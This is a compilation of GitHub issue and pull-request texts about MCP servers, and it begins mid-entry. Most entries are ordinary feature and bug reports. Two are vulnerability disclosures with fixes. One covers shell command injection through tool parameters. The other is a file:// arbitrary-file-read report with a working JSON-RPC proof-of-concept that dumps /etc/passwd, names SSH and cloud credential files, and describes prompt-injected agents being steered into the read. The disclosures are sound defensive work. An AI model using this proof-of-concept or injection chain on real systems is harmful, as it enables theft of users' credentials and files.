endpoint flows through the standard cognify entity-extraction pipeline. Sync : Full snapshot with write_disposition="replace" and stable content hashing so deleted or modified requests update cleanly on re-sync. Watch out for Secrets : Token values, Bearer strings, and environment secret values must be stripped during extraction. Only parameter names, keys, and structural schemas should be ingested. Schema Variance : Gracefully handle differences between Insomnia export v4 and v5 without crashing on optional attributes. Alternatives Considered None. Generic JSON ingestion does not understand Insomnia's resource graph or group hierarchies. Use Case A backend dev or agent asks: *"What headers does the payment webhook expect?"* or *"Which endpoint handles customer refunds?"* and cognee answers with the exact endpoint schema and docs from the team's internal collection. Implementation Ideas Model after packages/connector/notion in cognee-community , with DB-free unit tests against sample Insomnia v4/v5 fixtures.

title: ci: add automated MCP contract testing and schema fuzzing
cleaned_text: ci: add automated MCP contract testing and schema fuzzing Summary This PR integrates automated Model Context Protocol (MCP) contract testing and schema fuzzing into CI using gendjo-owlhead/mcp-contract-check@v1 . Why this matters Zero-fixture schema fuzzing: Automatically validates tool schemas by synthesizing boundary and negative cases against real server responses to verify schema adherence. Breaking change protection: Flags unintended schema modifications or removed tools in pull requests before client LLMs encounter runtime errors. Continuous reliability: Ensures client applications (Claude, Cursor, Antigravity) never encounter protocol failures. What was added Added .github/workflows/mcp-contract-check.yml (runs the stdio server against contract fuzzing) Added the "MCP Contract Validated" badge to README.md

title: v2.0.0: every tool call fails with "keyValidator._parse is not a function" (zod 4.x incompatible with MCP SDK)
cleaned_text: v2.0.0: every tool call fails with "keyValidator._parse is not a function" (zod 4.x incompatible with MCP SDK) Summary v2.0.0 is non-functional as an MCP server in Claude Desktop: every tool call fails with keyValidator._parse is not a function before the request reaches the Notion API. v1.2.4 works correctly in the identical environment and config. Environment @suekou/mcp-notion-server 2.0.0 (via npx -y @suekou/mcp-notion-server ) Host: Claude Desktop (macOS), stdio transport Auth: internal integration token, content access granted and verified (the same token works on v1.2.4) Reproduction Configure the server per the README quick start (npx, latest = 2.0.0). Call any tool — e.g. notion_search with {"query": "test"} , or notion_query_data_source with a valid data_source_id . Every call returns: keyValidator._parse is not a function This affects all tools, including read-only ones. We have also observed tool input schemas being published with empty properties objects, so MCP clients can't see parameter definitions either. Suspected root cause v2.0.0's package.json depends on "zod": "^4.4.1" alongside @modelcontextprotocol/sdk ^1.11.2 . The MCP SDK's schema handling (zod-to-json-schema) is incompatible with zod 4.x — this exact failure mode is documented upstream: modelcontextprotocol/typescript-sdk#906 (zod 4 incompatibility) The same break hit other servers, e.g. modelcontextprotocol/servers#3083 v1.2.4 has no zod 4 dependency and works correctly, which is consistent with this diagnosis. Suggested fix Pin zod to ^3.25.x (the version line the MCP SDK supports), or upgrade to an SDK version with zod 4 support, and verify tool calls against a real MCP host before release. Workaround for other users Pin the previous release in your MCP host config: "args": ["-y", "@suekou/mcp-notion-server@1.2.4"] Thanks for the server — v1.x has been solid for over a year of daily use.

cleaned_text: Fix: make debug log path configurable instead of hardcoded The log() helper wrote to a hardcoded absolute path (/Users/loom/temp/mcp-server.log). On any machine without that exact directory, appendFileSync throws ENOENT at startup — log('MCP server started') runs before the server initializes — so the server never starts. Default the log file to /unomi-mcp-server.log (portable) Allow overriding via a new UNOMI_LOG_FILE env var Wrap the write in try/catch so logging can never crash the server Document UNOMI_LOG_FILE in the README

title: Command Injection in configure_environment tool affects ALL downstream code execution (separate from CVE-2026-4199)
cleaned_text: Command Injection in configure_environment tool affects ALL downstream code execution (separate from CVE-2026-4199) Summary The configure_environment MCP tool in src/index.ts accepts unvalidated conda_name , venv_path , and uv_venv_path parameters and stores them directly into ENV_CONFIG with zero sanitization . These values are later interpolated unquoted into shell command template literals in getPlatformSpecificCommand() (line ~67) and executed via child_process.execAsync() through a system shell ( /bin/bash ). Unlike CVE-2026-4199 (which only covers install_dependencies ), this vector affects ALL downstream tools — execute_code , execute_code_file , install_dependencies , and check_installed_packages — because they all call getPlatformSpecificCommand() . PR #18 does not address this vulnerability. String(rawArgs.uv_venv_path) : undefined, }; ENV_CONFIG = { ...ENV_CONFIG, type: args.type, ...(args.conda_name && { conda_name: args.conda_name }), ...(args.venv_path && { venv_path: args.venv_path }), ...(args.uv_venv_path && { uv_venv_path: args.uv_venv_path }) }; No input validation, no shell metacharacter filtering. It does not : Validate or sanitize input in configure_environment Apply shell quoting in getPlatformSpecificCommand() Fix any of the other three affected tools Affected Versions All versions <= 0.3.0 (the latest release). Remediation Validate input in configure_environment : Reject shell metacharacters in conda_name , venv_path , uv_venv_path . Conda environment names should be alphanumeric + underscore only. Quote interpolated values in getPlatformSpecificCommand() : Use "${...}" around all interpolated variables in shell template literals. Apply the fix at the getPlatformSpecificCommand() level — this single function is the choke point that protects ALL downstream tools. title: Command Injection in install_dependencies tool due to unsafe use of child_process.exec
cleaned_text: Command Injection in install_dependencies tool due to unsafe use of child_process.exec Summary The MCP server _mcp_code_executor_ is vulnerable to command injection due to unsafe use of child_process.exec with user-controlled input in the _install_dependencies_ tool. Affected Versions <= 0.3.0 Vulnerable Code https://github.com/bazinga012/mcp_code_executor/blob/master/src/index.ts#L314-L359 Details The MCP tool install_dependencies constructs a command string using user-supplied parameter packages, and executes it via child_process.exec. Because exec invokes commands through a system shell, specially crafted input containing shell metacharacters (such as ; , & , or | ) may be interpreted as additional commands rather than treated as data. For example, an attacker may supply a malicious value in packages to inject arbitrary shell commands, which are then executed with the privileges of the MCP server process. The vulnerability results from shell-based command execution combined with direct interpolation of untrusted user input. In MCP environments, LLM-generated tool parameters influenced by external content may trigger execution of injected commands without direct local user interaction. Impact Successful exploitation allows attackers to execute arbitrary commands on the server hosting the MCP service. This may allow attackers to execute commands, access sensitive data, or modify the host environment depending on the privileges of the MCP server. Recommendation Don't use exec. Use execFile instead, which pins the command and provides the arguments as array elements. Apply strict input validation to all tool parameters exposed to MCP clients, especially the packages parameter. Use parameter separation with proper escaping to prevent shell command injection. PoC See the attached files: mcp_code_executor_bug.pdf

title: fix: prevent command injection vulnerabilities in install_dependencie…
cleaned_text: fix: prevent command injection vulnerabilities in install_dependencie… …s tool This change replaces the unsafe use of child_process.execAsync in the install_dependencies tool with execFileAsync and passes command arguments as arrays instead of constructing shell command strings. Previously, the install_dependencies tool built package installation commands by concatenating user-controlled packages into shell command strings such as conda install, pip install, or uv pip install, and then executed them via child_process.execAsync. Because exec invokes commands through a system shell, specially crafted package names could potentially be interpreted as additional commands, leading to command injection. This update: replaces child_process.execAsync with execFileAsync passes installation arguments as arrays instead of interpolated shell command strings removes shell-based package list construction in install_dependencies preserves the existing dependency installation behavior across supported environment types By avoiding shell interpretation of user-controlled package names, this change prevents potential command injection vulnerabilities while maintaining the original functionality of the install_dependencies tool.

title: [Potential Vulnerability] Arbitrary Local File Read via Unrestricted file:// URLs in s_fetch_page and s_fetch_pattern
cleaned_text:
[Potential Vulnerability] Arbitrary Local File Read via Unrestricted file:// URLs in s_fetch_page and s_fetch_pattern Summary scrapling-fetch-mcp ( cyberchitta/scrapling-fetch-mcp ) is an MCP server that fetches web pages for an agent, using Scrapling to bypass bot-protection. Its two tools, s_fetch_page and s_fetch_pattern , take a caller-supplied url and pass it to the fetcher without any scheme validation . Because the underlying fetcher accepts file:// URLs, an MCP client (or an LLM that has been prompt-injected to call either tool with a file:// URL) can read any file the server process can read and have its contents returned in the tool response, dressed up as fetched "web content". The tools are described to the model as fetching *websites* ("Fetches a complete web page", "Retrieves content from websites"), so neither the schema nor any runtime check restricts the request to http / https . file:///etc/passwd is fetched and returned verbatim. Affected component Repository: PyPI package name: scrapling-fetch-mcp , version 0.2.2 at the time of report (per pyproject.toml ); console entry point scrapling-fetch-mcp = scrapling_fetch_mcp.mcp:run_server . Verified against commit 084e246d9957b4651d24344c4f13b7d248c1d8c1 on main (default branch HEAD, pushed 2026-05-13). The repository has no git tags, so the commit hash is the only stable reference. Tools exposing the primitive: s_fetch_page(url, mode="basic", …) — handler at src/scrapling_fetch_mcp/mcp.py:15 s_fetch_pattern(url, search_pattern, mode="basic", …) — handler at src/scrapling_fetch_mcp/mcp.py:42 Root cause Both tools funnel into fetch_page_impl / fetch_pattern_impl ( src/scrapling_fetch_mcp/_fetcher.py:75,94 ), which call browse_url ( _fetcher.py:78,102 ): page = await browse_url(url, mode) content = _html_to_markdown(page.html_content) if is_markdown else page.html_content browse_url ( src/scrapling_fetch_mcp/_scrapling.py:5 ) hands the URL straight to Scrapling with no scheme/host check: async def browse_url(url: str, mode: str) -> Any: from scrapling.fetchers import AsyncFetcher, StealthyFetcher if mode == "basic": return await AsyncFetcher.get(url, stealthy_headers=True) # <-- caller's url, any scheme elif mode == "stealth": return await StealthyFetcher.async_fetch(url, headless=True, network_idle=True) ... AsyncFetcher.get (Scrapling's curl-cffi backend, used by the default mode="basic" ) follows the file:// scheme and returns the local file's bytes as html_content . There is no allow-list of schemes, no urlparse(...).scheme in {"http","https"} guard, and no host restriction anywhere between the tool boundary and the fetcher. The returned content is then wrapped in the tool's METADATA: {...}

[content] envelope and handed back to the caller. Impact The MCP server typically runs as the desktop user that owns the agent / IDE session. Under that uid, an attacker who can influence the MCP client (the standard prompt-injection threat model) can: Read any file the server uid can read — /etc/passwd , SSH keys, cloud credentials ( ~/.aws/credentials , ~/.config/gh/hosts.yml , ~/.npmrc ), .env files, source code — by calling s_fetch_page({ url: "file:/// " }) and receiving the contents inside result.content[0].text . Reach the same primitive through both tools ( s_fetch_page and s_fetch_pattern ), and through every mode ( basic uses curl-cffi; the stealth modes use a browser engine that also resolves file:// ). A fix that only guards one tool or one mode would not close the bug. Pull large files subject only to the tool's max_length pagination (the metadata reports total_length / percent_retrieved , so an attacker can page through an entire file with successive start_index requests). Because the tools are *meant* to fetch arbitrary http / https URLs, the bug is specifically the failure to restrict the scheme: a fetcher for web content should not double as a local-file reader. This fits the standard prompt-injection threat model: an attacker delivers content (web page, document, README, ticket, email) that the agent processes; the content instructs the model to call s_fetch_page with a file:// URL pointing at a chosen target. It does not by itself yield code execution. CWE / classification CWE-22: Improper Limitation of a Pathname to a Restricted Directory CWE-200: Exposure of Sensitive Information to an Unauthorized Actor CWE-610: Externally Controlled Reference to a Resource in Another Sphere (scheme not restricted to http / https ) Suggested severity: Medium–High Reproduction The PoC below speaks raw JSON-RPC over the server's stdio transport. Verified end-to-end against HEAD of main (commit 084e246 ): s_fetch_page returned the contents of both a planted file and /etc/passwd when given file:// URLs. Build and run All paths below are absolute. Save the client script (given after this block) to the exact path /tmp/poc.py . The cloned server and its virtualenv live in /tmp/scrapling-poc , and the venv's Python is always referenced as /tmp/scrapling-poc/.venv/bin/python . 1. Clone and install (pulls scrapling + curl-cffi; no browser needed for mode=basic) git clone https://github.com/cyberchitta/scrapling-fetch-mcp /tmp/scrapling-poc cd /tmp/scrapling-poc python3 -m venv .venv && .venv/bin/pip install -e . 2. Save the script below to /tmp/poc.py, then plant a "sensitive" file to read printf 'POC-SECRET scrapling: root:x:0:0:root:/root:/bin/bash
GITHUB_TOKEN=ghp_EXAMPLEdeadbeef
' > /tmp/scrapling_poc_target.txt 3. Drive the server over stdio (the client spawns the server itself; cwd is set inside poc.py) /tmp/scrapling-poc/.venv/bin/python /tmp/poc.py Save as /tmp/poc.py — raw JSON-RPC client over stdio (it spawns the server with cwd=/tmp/scrapling-poc , so it can be run from anywhere): import json, subprocess, sys, time proc = subprocess.Popen( [sys.executable, "-c", "from scrapling_fetch_mcp.mcp import run_server; run_server()"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, cwd="/tmp/scrapling-poc", text=True, bufsize=1) def send(m): proc.stdin.write(json.dumps(m) + "
"); proc.stdin.flush() def recv(t=40): end=time.time()+t while time.time()<end: l=proc.stdout.readline() if not l: break l=l.strip() if l.startswith("{"): try: o=json.loads(l) if "id" in o: return o except Exception: pass raise RuntimeError("no response") send({"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"poc","version":"0"}}}); recv() send({"jsonrpc":"2.0","method":"notifications/initialized"}) for tgt in ("file:///tmp/scrapling_poc_target.txt", "file:///etc/passwd"): send({"jsonrpc":"2.0","id":2,"method":"tools/call", "params":{"name":"s_fetch_page","arguments":{"url":tgt,"mode":"basic"}}}) txt = recv(40).get("result",{}).get("content",[{}])[0].get("text","") print(f"
=== s_fetch_page(url={tgt!r}, mode='basic') ===
{txt[:400]}") proc.stdin.close(); proc.terminate() Observed result === s_fetch_page(url='file:///tmp/scrapling_poc_target.txt', mode='basic') === METADATA: {"total_length": 89, "retrieved_length": 89, "is_truncated": false, "percent_retrieved": 100.0, "start_index": 0} POC-SECRET scrapling: root:x:0:0:root:/root:/bin/bash GITHUB\_TOKEN=ghp\_EXAMPLEdeadbeef === s_fetch_page(url='file:///etc/passwd', mode='basic') === METADATA: {"total_length": 3104, "retrieved_length": 3104, "is_truncated": false, "percent_retrieved": 100.0, "start_index": 0} root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin ... The contents of /tmp/scrapling_poc_target.txt and of /etc/passwd are returned to the caller inside result.content[0].text . Substituting the url with any other file:// path ( file:///root/.ssh/id_rsa , file:// /.env , …) yields the same outcome for any file the server uid can read. Expected result s_fetch_page and s_fetch_pattern should reject any url whose scheme is not http or https (and, ideally, refuse loopback / link-local / private-range hosts to also close server-side request forgery to internal services) before calling the fetcher. Suggested fix Validate the scheme at the tool boundary, before browse_url : from urllib.parse import urlparse def require_web_url(url: str) -> str: scheme = urlparse(url).scheme.lower() if scheme not in ("http", "https"): raise ValueError(f"unsupported URL scheme '{scheme}': only http/https are allowed") return url Apply it in fetch_page_impl / fetch_pattern_impl (or directly in the mcp.py tool functions) so every mode is covered. Optionally resolve the host and reject loopback ( 127.0.0.0/8 , ::1 ), link-local ( 169.254.0.0/16 , including the cloud metadata endpoint 169.254.169.254 ), and RFC-1918 ranges, to prevent the same tools from being used for SSRF against internal services. Update the s_fetch_page / s_fetch_pattern tool-schema description fields to state that only http / https web URLs are accepted, so the model is not steered into passing file:// URLs by injected instructions.

Problem Statement Currently, developers using easy-mcp-server need to implement common functionality like: Standardized API response handling Redis caching integration LLM service integration Structured logging MCP resource management Error handling patterns This leads to: Code duplication across projects Inconsistent API response formats Lack of standardized error handling Difficulty in implementing common patterns Reduced developer productivity Proposed Solution Add the following enhanced utilities to the easy-mcp-server framework: 1. APIResponseUtils Class Standardized error response formatting Success response standardization Validation error handling Authentication and authorization error responses Request validation utilities 2. BaseAPIEnhanced Class Enhanced version of existing BaseAPI Redis client integration MCP resource and prompt management Standardized response handling Service initialization utilities 3. RedisClient Class Connection management with automatic reconnection Structured logging for Redis operations Error handling and fallback mechanisms Service-specific key namespacing JSON serialization/deserialization 4. LLMService Base Classes BaseLLMService abstract class MockLLMService for testing and development OpenAILLMService implementation Streaming response support Non-blocking I/O patterns 5. Logger Utility JSON and text log formatting Context-aware logging Request/response logging Cache operation logging MCP call logging 6. MCP Resource Loader Resource loading from files Prompt management Markdown and JSON resource creation Directory-based resource loading 7. WordPressSourceManager Source key management Redis-based duplicate detection Standardized response formatting Benefits Reduced Development Time : Developers can focus on business logic instead of boilerplate code Consistent API Design : Standardized response formats across all services Better Error Handling : Comprehensive error handling with helpful messages Performance : Built-in Redis title: DMD-1701: merge-request MCP tools (Branches 2.0, non-SOX)
cleaned_text: DMD-1701: merge-request MCP tools (Branches 2.0, non-SOX) Description Linear : DMD-1701 RFC : feature_spec/branches_merge_requests_mcp/RFC.md on branch ms/merge-requests/dmd-1701 (the RFC PR #612 is closed; bringing the RFC in line with what shipped is tracked in DMD-2246). This PR does not include the RFC. Change Type [ ] Major (breaking changes, significant new features) [x] Minor (new features, enhancements, backward compatible) [ ] Patch (bug fixes, small improvements, no new features) Summary Implements the Branches 2.0 (non-SOX) merge-request flow as 9 MCP tools in a new package tools/merge_requests/ , so a user on a development branch can ship changes to production from the chat: Tool | Session | Role | Notes get_merge_requests | any | any | list (optional state filter, raw or derived) or batched detail with the derived status create_merge_request | dev branch | admin/share/OAuth | source = session branch, target = production; no branch params update_merge_request | any | admin/share/OAuth | the only way to disarm auto-merge request_merge_request_review | dev branch | admin/share/OAuth | rarely needed: merge skips review itself when approvals suffice approve_merge_request | any | admin/share/OAuth | valid only in in_review request_merge_request_changes | any | admin/share/OAuth | reviewer's "reject"; not terminal merge_merge_request | dev branch | admin/share/OAuth | awaits the Storage job; 409 mapped by code ( conflicts / not_ready ) get_merge_request_conflicts | dev branch | any | conflicts + three-way diff + per-path changed_by classification resolve_merge_request_conflict | dev branch | admin/share/OAuth | take=ours|theirs|delete or a strict custom body, via rebase {version, diff} Every MR-returning tool carries the same derived status ( derived_state , merge_blockers , mergeable , allowed_actions , viewer , live conflicts ) and a deterministic next_step sentence (15-row decision table, status.py ) so the agent branches on data, not prose. The derivations are a port of the kbagent CLI's Layer 2 and read server-first (DMD-1988) with the local tables as fallback. Other changes: clients/storage.py : merge_requests_list , merge_request_detail(include_activity_log) , merge_request_conflicts , merge_request_create/update/request_review/approve/request_changes/merge , configuration_diff , configuration_rebase(version, diff) ; 'branches-merge-requests' added to ProjectFeature . mcp.py : three-axis gating in authorize_tool_call by name set ( MERGE_REQUEST_TOOL_NAMES , MERGE_REQUEST_BRANCH_ONLY_TOOLS in tools/constants.py ): feature (hide + deny), role with the existing OAuth carve-out (hide writes + deny), session branch ( deny only , the branch-only tools stay visible on production so the model keeps their descriptions and can hand the user off). on_call_tool now stores token_info in session state ( TOKEN_INFO_STATE_KEY ) so tool bodies do not verify the token a second time. links.py : get_merge_request_link (the source branch's development overview, as Connection's MR emails link it). TOOLS.md regenerated; version 1.80.1 → 1.81.0 ; uv.lock refreshed. Deviations from the RFC worth knowing: resolved is typed dict in the tool schema (validated by ResolvedConfiguration with StrictBool before any network call) because the tool-schema test requires a type on every parameter; the write tools cost one more request than the RFC's count (the branches_list needed for branch names / links), i.e. 4 uncached / 3 with the token cache; token_info is shared with the tool body through a call-scoped contextvar. In a multi-project scope get_merge_requests takes project_id and is dispatched single-target by MultiProjectMiddleware (merge-request ids are project-specific); the five branch-only tools ( create , request_review , merge , get_merge_request_conflicts , resolve ) declare no project_id and always run against the active project's session branch. update_merge_request ships as the only way to disarm auto-merge. destructiveHint follows the repo convention (create=False, resolve=True; the RFC's C4 said create=True). The merge PUT opts out of the HTTP client's retry policy (a retried merge would misreport a started merge as refused). Review follow-ups (CLI parity, OAuth role, RFC, E2E) are tracked in DMD-2246. Integration tests ( integtests/tools/test_merge_requests.py ): happy path create → merge → published and the conflict loop. title: RLS: metastore-backed row-level security for query_data (pilot, supersedes #697)
cleaned_text: RLS: metastore-backed row-level security for query_data (pilot, supersedes #697) Description Linear : AI-XXX (pilot, no Linear issue assigned yet -- same precedent as #697) Depends on #695 (AI-3790, not yet merged) -- this branch is stacked on it because RlsRules.from_metastore() needs the source_project_id / target_project_ids fields #695 adds to MetaObjectMeta . The diff shown here is only this branch's own commits on top of #695. Supersedes #697 ( feat/rls-query-tool , @padak, pilot/do-not-merge). That PR's SQL-rewrite engine ( rls.py 's rewrite_query / _check_output /CTE-shadowing/FROM-source-allowlisting) is kept almost entirely intact. What changes: rules move from a deployment-level YAML file to Keboola Metastore rls-policy objects authored via declarative primitives (never hand-written SQL), query_data_rls is retired in favor of a single query_data tool gated by a project feature flag + per-table policy existence, and identity comes from the caller's own OAuth login instead of a header or tool argument. Full design rationale, JSON schema, and companion task breakdowns for the two dependent repos ( kbagent CLI, the metastore backend) are in feature_spec/rls_query_tool/RFC.md and PLAN.md in this PR. Change Type [ ] Major (breaking changes, significant new features) [x] Minor (new features, enhancements, backward compatible) [ ] Patch (bug fixes, small improvements, no new features) Summary New Metastore object type rls-policy (not yet registered on the backend -- see PLAN.md 's go-monorepo section): one object per protected table, authored exclusively at organization / targeted scope by an org admin, never project scope -- a project's own admins can never author policies for their own tables. A policy applies to a project only when its source_project_id matches, or the project is listed in target_project_ids ; matching on the table-name text alone is never enough, since an org-scoped object is visible to every project in the org. Declarative primitives, not SQL text : _compile_primitive() builds sqlglot.exp.Condition trees directly from column / op / value shapes ( eq / ne / gt / gte / lt / lte / in / not_in / is_null / is_not_null , and / or nesting, an explicit true sentinel) -- never by parsing a formatted string, closing the injection surface the pilot's raw-predicate-string model had. query_data absorbs RLS entirely. Gated by client.has_feature('row-level-security') (same mechanism as GLOBAL_SEARCH_FEATURE / STORAGE_BRANCHES_FEATURE ) -- off by default, no metastore call at all when off. Within an enabled project, a table with no applicable policy is left completely untouched ( RlsRules.is_governed ); a table a policy does name is still fail-closed exactly as the pilot enforced (no rule for the resolved principal ⇒ refused). references_governed_table() is a cheap, lenient pre-check so an unrelated query never pays the paranoid pipeline's restrictions. Identity from OAuth login, not a header/argument. exchange_authorization_code() 's existing introspect_token() call (previously only used for scope auto-confirm) now also persists Introspection.user_email onto the session row -- no second network round-trip. A non-OAuth (PAT/header-token) session simply has no principal to resolve, which is the ordinary "no identity, no RLS-gated access" outcome, not a special case. No frozen state. Identity and policy both resolve live on every call (a short in-memory read isn't even needed for correctness, just optional latency headroom later) -- a server restart mid-conversation costs nothing, unlike the pilot's load-once-at-startup model. Schema 1.1.0 (registered as the metastore default by keboola/go-monorepo#617, AI-4010): the engine reads 1.0.0 and 1.1.0 objects. A rule selects by principal , principals or IdP groups ; within a policy every rule selecting the identity applies (RLS conditions OR, CLS columns union), replacing the old "repeated principal refuses the load" error; several policies on one table combine with AND (CLS: intersection), so an added policy can only narrow access; {"$identity": "email"} / {"$identity": "groups"} resolve to bound literals per identity (no email / no groups matches nothing); a policy default covers an identified reader no rule selects (a reader with no identity is always refused), and {"false": true} matches no row; dialect is optional and a policy for the other backend refuses reads of its own table only. A reader without an email is refused before any rule or default. MCP sessions have no group source yet, so their groups are *unknown*: groups rules never match them and a policy that has a group rule applies no default to them. See RFC v5 / PLAN Task 11. Deferred, not implemented here : re-triggering ToolAuthorizationMiddleware 's read-only mode for RLS-active sessions. It would add an async feature-flag check to *every* tool call in *every* project (not just query_data 's own, already-correct check) -- see PLAN.md Task 5 for the full rationale and what a safe version would need (session-scoped caching). Testing [ ] Tested with Cursor AI desktop ( Streamable-HTTP transports) Optional testing [ ] Tested with Cursor AI desktop (all transports) [ ] Tested with claude.ai web and canary-orion MCP ( Streamable-HTTP ) [ ] Tested with In Platform Agent on canary-orion [ ] Tested with RO chat on canary-orion tox (ruff + pytest + check-tools-docs) green except the pre-existing, environment-specific test_json_logging (verified it reproduces identically on unrelated commits -- not caused by this change). New/adapted unit coverage: tests/test_rls.py (primitive compiler, from_metastore incl. project-applicability filtering, the rewrite engine's per-table opt-in behavior), tests/tools/test_sql.py ( query_data 's RLS integration: flag off, no applicable policy, no identity, no rule for principal, matching rule, mixed governed/ungoverned join), tests/test_oauth.py (identity persistence from introspection), tests/test_mcp.py (the new session-state accessor). No manual testing against a real client yet -- the backend rls-policy object type doesn't exist until the go-monorepo companion plan lands, so this can't be exercised end-to-end against a live metastore yet. cleaned_text: AI-4029: Redact secrets in tool-call telemetry Description Linear : AI-4029 Change Type [ ] Major (breaking changes, significant new features) [ ] Minor (new features, enhancements, backward compatible) [x] Patch (bug fixes, small improvements, no new features) Summary A tool call that carries a secret (a # key, an update of a secret path, or text showing a secret key) is now reported fail-closed: the Storage event and the log lines list the argument names only and omit the failure text, so a secret cannot reach either through an echoed value. The detection is one small module ( redaction.py ); nothing is masked or scrubbed. A failing call that carries a secret, or whose message shows a secret key, raises a RedactedToolError (the caller still gets the real text, except for a message showing a secret key); FastMCP logs it without the message, and the server's logging middleware logs its log_text instead of the error text (for an error without one, such as an argument validation failure, it logs an omission note when the request carries a secret). FastMCP's retry hints for an upstream 429 or timeout are kept for such calls. A call without a secret is reported as before. title: feat: migrate from API based toolkit to MCP based architecture
cleaned_text: feat: migrate from API based toolkit to MCP based architecture Summary Migrates the Maton Agent Toolkit from a direct API-based architecture (v0.0.x) to an MCP-based architecture (v0.1.0+). Instead of bundling a fixed set of per-app actions, the toolkit now connects to the remote Maton MCP server, discovers the available tools at runtime, and exposes them in each framework's native tool format. This also reorganizes the repo into tools/ (the toolkit packages) and providers/ (editor/harness plugins). What changed Repo restructure Moved typescript/ → tools/typescript/ and modelcontextprotocol/ → tools/modelcontextprotocol/ . Added tools/python/ — a new Python toolkit (OpenAI Agents SDK, LangChain, CrewAI, Strands). Added providers/ plugins that wire up the Maton MCP server for Claude Code, Cursor, Codex, and Kiro. Added marketplace manifests ( .claude-plugin , .cursor-plugin , .agents/plugins ) and gemini-extension.json . MCP-based toolkit The toolkit connects to https://mcp.maton.ai (OAuth or Authorization: Bearer API key), discovers tools at runtime, and converts them to each framework's tool format. Exposes a generic MCP tool set — whoami , connection management ( create/delete/list/get_connection ), discovery ( search_apps , search_actions , get_action ), execution ( run_action ), and a generic api gateway — covering 150+ apps. Removes the old per-app parameter/prompt/tool definitions ( shared/parameters/* , shared/prompts/* , shared/tools.ts ). Breaking changes (v0.0.x → v0.1.0) Async initialization required — use await createMatonAgentToolkit(...) (or await toolkit.initialize() ); synchronous usage now throws. Call await toolkit.close() to clean up. MCP connection required — tools are fetched from mcp.maton.ai ; network access to HTTPS/443 is required, with no offline fallback. app / agent / actions config removed — no more static app/action allowlists; the agent discovers apps and actions at runtime. apiKey moved under a configuration wrapper ( ToolkitConfig ); defaults to the MATON_API_KEY env var. Tool names changed — per-app methods like hubspot_create_contact are replaced by generic tools ( search_actions / get_action / run_action ). @modelcontextprotocol/sdk is now a direct dependency. See tools/typescript/MIGRATION.md and tools/python/MIGRATION.md for full before/after examples.
